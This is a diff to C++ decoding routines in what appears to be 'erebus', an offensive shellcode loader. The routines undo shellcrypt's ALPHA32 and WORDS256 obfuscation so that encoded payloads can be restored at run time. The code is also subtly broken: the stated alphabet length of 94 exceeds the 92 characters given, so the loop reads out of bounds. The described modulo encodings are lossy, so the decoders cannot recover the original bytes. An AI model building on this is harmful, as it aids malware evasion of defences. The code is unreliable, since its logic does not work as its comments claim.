@@ -199,16 +199,25 @@ namespace erebus {
 
 	BOOL DecodeALPHA32(_In_ const CHAR* Input, IN SIZE_T InputLen, _Out_ BYTE** Output, _Out_ SIZE_T* OutputLen)
 	{
-		const CHAR Alpha32Alphabet[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/";
-		SIZE_T OutputCapacity = InputLen;
-		BYTE* DecodedData = (BYTE*)malloc(OutputCapacity);
+		// Alphabet must match shellcrypt exactly (crypters.py __alpha32_encode).
+		// Each byte is encoded as alphabet[byte % len(alphabet)].
+		// Decode: find char position in alphabet → that is the byte value.
+		static const CHAR kAlphabet[] =
+			"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+			"0123456789"
+			"abcdefghijklmnopqrstuvwxyz"
+			"!#$%&'()*+,-./:;<=>?@[]^_`{|}~";
+		static const int kAlphaLen = 94;
+
+		BYTE* DecodedData = (BYTE*)malloc(InputLen + 1);
+		if (!DecodedData) { return FALSE; }
 		SIZE_T DecodedLen = 0;
 
 		for (SIZE_T i = 0; i < InputLen; i++)
 		{
-			for (int j = 0; j < 64; j++)
+			for (int j = 0; j < kAlphaLen; j++)
 			{
-				if (Input[i] == Alpha32Alphabet[j])
+				if (Input[i] == kAlphabet[j])
 				{
 					DecodedData[DecodedLen++] = (BYTE)j;
 					break;
@@ -223,40 +232,47 @@ namespace erebus {
 
 	BOOL DecodeWORDS256(_In_ const CHAR* Input, IN SIZE_T InputLen, _Out_ BYTE** Output, _Out_ SIZE_T* OutputLen)
 	{
-		// WORDS256 encoding uses a 256-word dictionary - each word is replaced with its index
-		// This is a placeholder implementation; adjust based on your specific word dictionary
-		SIZE_T OutputCapacity = InputLen * 2;
-		BYTE* DecodedData = (BYTE*)malloc(OutputCapacity);
+		// shellcrypt words256: each byte encoded as kWords[byte % 26] + " "
+		// Decode: look up word in table, return its index.
+		// Same word list as crypters.py __words256_encode/__words256_decode.
+		static const CHAR* const kWords[] = {
+			"Alpha", "Bravo", "Charlie", "Delta", "Echo", "Foxtrot",
+			"Golf", "Hotel", "India", "Juliet", "Kilo", "Lima", "Mike",
+			"November", "Oscar", "Papa", "Quebec", "Romeo", "Sierra", "Tango",
+			"Uniform", "Victor", "Whiskey", "X-ray", "Yankee", "Zulu"
+		};
+		static const int kWordCount = 26;
+
+		BYTE* DecodedData = (BYTE*)malloc(InputLen);
+		if (!DecodedData) { return FALSE; }
 		SIZE_T DecodedLen = 0;
 
-		const CHAR* WordDelimiters = " \t\n\r";
 		SIZE_T i = 0;
-
-		while (i < InputLen && DecodedLen < OutputCapacity)
+		while (i < InputLen)
 		{
-			// Skip delimiters
-			while (i < InputLen && strchr(WordDelimiters, Input[i]))
+			// Skip leading whitespace between words
+			while (i < InputLen && (Input[i] == ' ' || Input[i] == '\t' ||
+			                        Input[i] == '\n' || Input[i] == '\r'))
 				i++;
-
 			if (i >= InputLen) break;
 
-			// Extract word index
+			// Identify word end (next space or end of input)
 			SIZE_T WordStart = i;
-			while (i < InputLen && !strchr(WordDelimiters, Input[i]))
+			while (i < InputLen && Input[i] != ' ' && Input[i] != '\t' &&
+			       Input[i] != '\n' && Input[i] != '\r')
 				i++;
-
 			SIZE_T WordLen = i - WordStart;
-			DWORD WordIndex = 0;
 
-			// Convert word to index (assumes numeric word index)
-			for (SIZE_T j = 0; j < WordLen && j < 3; j++)
+			// Match against word table
+			for (int j = 0; j < kWordCount; j++)
 			{
-				WordIndex = WordIndex * 10 + (Input[WordStart + j] - '0');
-			}
-
-			if (WordIndex <= 255)
-			{
-				DecodedData[DecodedLen++] = (BYTE)WordIndex;
+				SIZE_T TableWordLen = strlen(kWords[j]);
+				if (WordLen == TableWordLen &&
+				    strncmp(Input + WordStart, kWords[j], TableWordLen) == 0)
+				{
+					DecodedData[DecodedLen++] = (BYTE)j;
+					break;
+				}
 			}
 		}
 
@@ -335,8 +351,12 @@ namespace erebus {
 
 	BOOL IsValidALPHA32Char(CHAR c)
 	{
-		const CHAR Alpha32Alphabet[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/";
-		return strchr(Alpha32Alphabet, c) != NULL;
+		static const CHAR kAlphabet[] =
+			"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+			"0123456789"
+			"abcdefghijklmnopqrstuvwxyz"
+			"!#$%&'()*+,-./:;<=>?@[]^_`{|}~";
+		return strchr(kAlphabet, c) != NULL;
 	}
 
 	BOOL IsValidWORDS256Format(_In_ const CHAR* Input, IN SIZE_T InputLen)
